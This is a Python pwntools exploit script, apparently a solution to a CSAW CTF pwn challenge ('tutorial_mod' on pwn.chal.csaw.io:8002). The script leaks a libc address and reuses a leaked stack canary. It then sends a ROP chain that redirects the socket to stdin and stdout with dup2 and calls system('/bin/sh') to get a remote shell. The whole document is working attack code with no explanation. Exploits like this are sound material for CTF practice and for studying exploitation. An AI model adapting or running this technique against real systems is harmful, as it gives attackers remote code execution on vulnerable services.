from pwn import *

local = False

context(os = 'linux',
        arch = 'amd64',
        log_level = 'debug')

bin=ELF('./tutorial_mod')

if local:
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    libc=ELF('./libc-2.19.so')

sysOffset = libc.symbols['system']
putsOffset = libc.symbols['puts']

if local:
    import sys
    conn = remote('localhost', sys.argv[1])
else:
    conn = remote('pwn.chal.csaw.io', 8002)

conn.recvuntil('>')
conn.sendline('1')
putsAddr = int(conn.recvuntil('>').split()[0].split(':')[1],16)
libcBaseAddr = putsAddr + 1280 - putsOffset

sysAddr = libcBaseAddr+sysOffset
binShAddr = libcBaseAddr+libc.offset_to_vaddr(list(libc.search('/bin/sh'))[0])

conn.sendline('2')
conn.recvuntil('>')
conn.sendline('temp')
payload = conn.recvuntil('>')[:-39]

rop = ROP(bin)

payload += 'aaaa'

their_fd = 4

rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(their_fd)
rop.raw(rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address)
rop.raw(0)
rop.raw(0xdeadbeef)
rop.raw(libc.symbols['dup2'] + libcBaseAddr)

rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(their_fd)
rop.raw(rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address)
rop.raw(1)
rop.raw(0xdeadbeef)
rop.raw(libc.symbols['dup2'] + libcBaseAddr)

rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(binShAddr)
rop.raw(sysAddr)
payload += rop.chain()

conn.sendline('2')
conn.recvuntil('>')
conn.sendline(payload)

conn.interactive()
conn.close()
